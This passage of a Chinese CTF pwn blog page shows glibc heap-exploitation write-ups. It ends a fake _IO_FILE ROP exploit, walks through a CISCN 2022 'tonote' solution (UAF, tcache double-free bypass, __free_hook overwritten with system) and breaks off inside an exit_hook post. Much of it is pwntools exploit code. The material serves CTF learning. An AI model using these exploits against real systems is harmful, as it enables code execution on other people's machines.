libc_base + <span class="number">0x000000000014d09a</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">close = libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x26699</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x112a51</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005525c</span></span><br><span class="line">pop3 = libc_base + <span class="number">0xfc103</span></span><br><span class="line"></span><br><span class="line">fp = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x48</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>) <span class="comment">#rbp</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x40</span> + <span class="number">0x18</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_wide_data-&gt;write_ptr &gt; _wide_data-&gt;write_base</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0x40</span>) <span class="comment">#_wide_data =&gt; A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode &gt; 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0xc0</span>) <span class="comment"># B</span></span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line"><span class="comment"># &lt;= rbp point to</span></span><br><span class="line">fake_IO_FILE += p64(leave_ret) + p64(pop3) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ret)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(fp + <span class="number">0x218</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fake_IO_FILE),<span class="number">0x10</span>):</span><br><span class="line">	edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>+i))</span><br><span class="line">	edit(<span class="number">1</span>,p64(<span class="number">1</span>))</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">0</span>,fake_IO_FILE[i:i+<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#abort b _IO_flush_all_lockp</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x7ffff7fb8e20</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/28/2022ciscn%E5%8D%8E%E5%8C%97%E5%8D%8A%E5%86%B3-tonote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/28/2022ciscn%E5%8D%8E%E5%8C%97%E5%8D%8A%E5%86%B3-tonote/" class="post-title-link" itemprop="url">2022ciscn华北半决-tonote</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-28 16:31:18 / 修改时间：18:43:58" itemprop="dateCreated datePublished" datetime="2022-06-28T16:31:18+08:00">2022-06-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>scanf函数中例如：<code>__isoc99_scanf(&quot;%ld&quot;, &amp;v5);</code>这种情况，其会将我们的输入解析成长整型整数，虽然不会发生栈溢出，但是其没有限制我们的输入长度，当我们的输入比较短时，其缓冲区在栈上，但是如果输入很长（我试了一下，最少要0x400时才会向堆申请），那么其就会申请一个对应大小的chunk作为缓冲区，函数结束之后再free掉这个chunk。</p>
</li>
<li><p>tcache用chunk的bk指针作为标识符来识别double free，这个标识会在chunk进入tcache时被设置，如果存在uaf能修改tcache chunk的bk指针，就可以在tcache中实现double free</p>
</li>
</ol>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 vars8; <span class="comment">// [rsp+8h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  vars8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  v0 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">1</span> &amp;&amp; !size[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">    v2 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        size[v0] = v2;</span><br><span class="line">        heap[v0] = v3;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ vars8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v5);</span><br><span class="line">  v0 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heap[v5] )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v2 = size[v0];</span><br><span class="line">      v3 = heap[v0];</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = &amp;v3[v2];</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v3, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v3 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v3 == v4 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">        &#125;</span><br><span class="line">        *v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v3);</span><br><span class="line">  v0 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = heap[v3];</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v2);</span><br><span class="line">      size[v0] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = heap[v2];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见漏洞只有一个UAF，但是因为delete时将.bss段保存size的那部分置零了，所以delete之后不能直接edie它。</p>
<p>同时在add中可以看到，最多同时有两个可用的堆指针，并且申请chunk的大小最大为0x78，属于fast bin范围。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为有UAF，所以泄漏堆地址不是问题，问题在于怎么绕过malloc大小的限制，将一个chunk放到别的bin中，以往的思路就是用UAF部分写tcache bin chunk的fd指针，从而构造堆重叠修改某个chunk的size域，但是对于这题而言就行不通，因为delete后无法再用这个delete过的堆指针来进行edit，其次如果使两个堆指针都指向同一个chunk的话那么可用的堆指针就不够了。</p>
<p>所以这里就要用到一个知识点，就是用scanf函数来申请一个大块，从而触发malloc_consolidate()函数，使得chunk能进入别的bin中，具体过程就是：①将一个chunk先放入fast bin中。② 在用scanf函数进行输入时输入一段过长的数据，使得scanf函数在堆中申请内存。③ 因为bin中并没有能符合scanf所需大小的chunk，那么就会触发malloc_consolidate()函数，fast bin中的那个chunk就会进入small bin，这样我们就能泄漏libc地址。</p>
<p>那么一步一步完成以上步骤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>

<p>上面步骤是为了让两个堆指针都指向同一个chunk，同时泄漏了堆地址</p>
<p>因为本题add函数会判断对应Index的size处有无值，只有当无值的时候才能进行malloc，换句话说就是对应的堆指针只有被free过之后才能进行新的add，所以我们需要绕过tcache的double free检测来free掉同一个chunk，为此我们需要让两个堆指针指向同一个chunk，这样才能在free掉它的同时修改其bk指针。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	edit(<span class="number">1</span>,p64(<span class="number">0</span>) + <span class="string">&#x27;\x10&#x27;</span>)	<span class="comment">#修改fd和bk指针</span></span><br><span class="line">	free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>到此为止bin如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x80 [  7]: 0x55f878186260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x55f878186250 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>我们已经成功将一个chunk放到fast bin，接下来在scanf输入时输入过长数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>

<p>然后malloc_consolidate()函数就会将fast bin中的chunk放到small bin中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x80 [  7]: 0x55b431e11260 —▸ 0x7f08a0baed10 (main_arena+208) —▸ 0x7f08a0baed00 (main_arena+192) —▸ 0x7f08a0baecf0 (main_arena+176) —▸ 0x7f08a0baece0 (main_arena+160) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x80: 0x55b431e11250 —▸ 0x7f08a0baed10 (main_arena+208) ◂— 0x55b431e11250</span><br></pre></td></tr></table></figure>

<p>这样就得到了libc地址</p>
<p>剩下的部分就很简单了，只不过由于这题的add功能函数只有当我们delete过对应堆指针后才能在其上面申请chunk的缘故，我们需要稍微麻烦一点构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">40</span> + p64(<span class="number">0x51</span>) + p64(free_hook))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这部分也很简单，稍微想一下就行</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/22/exit-hook/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/22/exit-hook/" class="post-title-link" itemprop="url">exit_hook</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-22 14:14:51 / 修改时间：16:11:10" itemprop="dateCreated datePublished" datetime="2022-06-22T14:14:51+08:00">2022-06-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p>详细的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/14222558.html">exit_hook在pwn题中的应用</a>、<a target="_blank" rel="noopener" href="https://www.freesion.com/article/9980545061/">exit_hook劫持</a></p>
<p>这里直接写总结：</p>
<ol>
<li><p>在exit函数的调用链中会根据存在于<code>_rtld_global</code>结构体中的两个函数指针分别调用这两个函数：<code>__rtld_lock_lock_recursive</code>、<code>__rtld_lock_unlock_recursive</code>，而这两个函数指针是可写的，所以能被劫持</p>
</li>
<li><p>程序中即便没有主动调用exit函数，在程序正常返回到<code>__libc_start_main</code>时其也会调用exit函数，所以这个打法可能很多情况下都能用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7a2d840 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">  0x7ffff7a2d842 &lt;__libc_start_main+242&gt;    call   exit &lt;0x7ffff7a47040&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>所需条件就是有libc地址，能够任意地址写最少三个字节即可。</p>
<h4 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a>hfctf_2020_marksman</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">3</span>]; <span class="comment">// [rsp+25h] [rbp-Bh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_9BA(a1, a2, a3);</span><br><span class="line">  sub_A55();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Free shooting games! Three bullets available!&quot;</span>);</span><br><span class="line">  <span 